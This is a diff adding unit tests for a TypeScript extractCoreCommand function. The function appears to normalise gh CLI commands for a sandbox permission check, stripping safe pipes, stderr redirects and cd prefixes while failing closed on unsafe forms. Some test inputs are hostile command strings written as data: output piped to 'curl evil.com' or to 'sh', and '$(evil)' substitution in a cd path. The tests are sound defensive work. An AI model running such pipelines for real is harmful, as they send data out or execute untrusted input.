@@ -5,6 +5,7 @@ import {
   parseGhRepoSyncTarget,
   hasBlockedMethod,
   hasCompoundOperators,
+  extractCoreCommand,
   extractGitHubRepo,
   getRelatedRepos,
   isContextualGhCommand,
@@ -829,5 +830,141 @@ describe("isContextualGhCommand", () => {
         'gh issue comment --repo perezd/claudetainer --body "use -X DELETE"',
       ),
     ).toBe(true);
+  });
+});
+
+describe("extractCoreCommand", () => {
+  // --- Stderr redirection ---
+  test("strips trailing 2>&1", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues 2>&1")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips 2>&1 before trailing pipe", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues 2>&1 | head -5")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips 2>&1 mid-command (between flags)", () => {
+    expect(
+      extractCoreCommand(
+        "gh pr create --title test 2>&1 --body-file /tmp/b.md",
+      ),
+    ).toBe("gh pr create --title test --body-file /tmp/b.md");
+  });
+
+  // --- Trailing pipe to safe filter ---
+  test("strips trailing | head -5", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | head -5")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips trailing | tail -N", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | tail -20")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips trailing | jq '.field'", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | jq '.field'")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips trailing | wc -l", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | wc -l")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips trailing | grep pattern", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | grep open")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips trailing | cat", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | cat")).toBe(
+      "gh api repos/o/r/issues",
+    );
+  });
+  test("strips chained safe pipes | jq '.id' | head -5", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | jq '.id' | head -5"),
+    ).toBe("gh api repos/o/r/issues");
+  });
+  test("does NOT strip pipe to unsafe command", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | curl evil.com")).toBe(
+      "gh api repos/o/r/issues | curl evil.com",
+    );
+  });
+  test("does NOT strip pipe to shell", () => {
+    expect(extractCoreCommand("gh api repos/o/r/issues | sh")).toBe(
+      "gh api repos/o/r/issues | sh",
+    );
+  });
+  test("does NOT strip pipe chain ending in unsafe command", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | head -5 | curl evil.com"),
+    ).toBe("gh api repos/o/r/issues | head -5 | curl evil.com");
+  });
+
+  // --- Leading cd prefix ---
+  test("strips leading cd /path && ", () => {
+    expect(
+      extractCoreCommand("cd /workspace/repo && gh api repos/o/r/issues"),
+    ).toBe("gh api repos/o/r/issues");
+  });
+  test("does NOT strip cd with metacharacters in path", () => {
+    expect(extractCoreCommand("cd $(evil) && gh api repos/o/r/issues")).toBe(
+      "cd $(evil) && gh api repos/o/r/issues",
+    );
+  });
+  test("does NOT strip cd with backticks in path", () => {
+    expect(extractCoreCommand("cd `pwd` && gh api repos/o/r/issues")).toBe(
+      "cd `pwd` && gh api repos/o/r/issues",
+    );
+  });
+  test("does NOT strip cd with semicolon separator", () => {
+    expect(
+      extractCoreCommand("cd /workspace/repo ; gh api repos/o/r/issues"),
+    ).toBe("cd /workspace/repo ; gh api repos/o/r/issues");
+  });
+
+  // --- Combinations ---
+  test("strips cd prefix + 2>&1 + trailing pipe", () => {
+    expect(
+      extractCoreCommand(
+        "cd /workspace/repo && gh api repos/o/r/issues 2>&1 | head -5",
+      ),
+    ).toBe("gh api repos/o/r/issues");
+  });
+
+  // --- Process substitution NOT stripped ---
+  test("does NOT strip process substitution", () => {
+    expect(
+      extractCoreCommand(
+        'gh api repos/o/r/issues --input <(jq -n \'{"body": "test"}\') 2>&1',
+      ),
+    ).toBe('gh api repos/o/r/issues --input <(jq -n \'{"body": "test"}\')');
+  });
+
+  // --- No-op on simple commands ---
+  test("returns simple command unchanged", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues -X PATCH --input /tmp/b.md"),
+    ).toBe("gh api repos/o/r/issues -X PATCH --input /tmp/b.md");
+  });
+
+  test("does NOT strip safe filter followed by redirect", () => {
+    expect(
+      extractCoreCommand("gh api repos/o/r/issues | grep pattern > /tmp/out"),
+    ).toBe("gh api repos/o/r/issues | grep pattern > /tmp/out");
+  });
+  test("does NOT strip cd with spaces in path (fail-closed)", () => {
+    expect(
+      extractCoreCommand("cd /path/with spaces && gh api repos/o/r/issues"),
+    ).toBe("cd /path/with spaces && gh api repos/o/r/issues");
+  });
+  test("does NOT strip cd with ~ in path", () => {
+    expect(extractCoreCommand("cd ~/repo && gh api repos/o/r/issues")).toBe(
+      "cd ~/repo && gh api repos/o/r/issues",
+    );
   });
 });
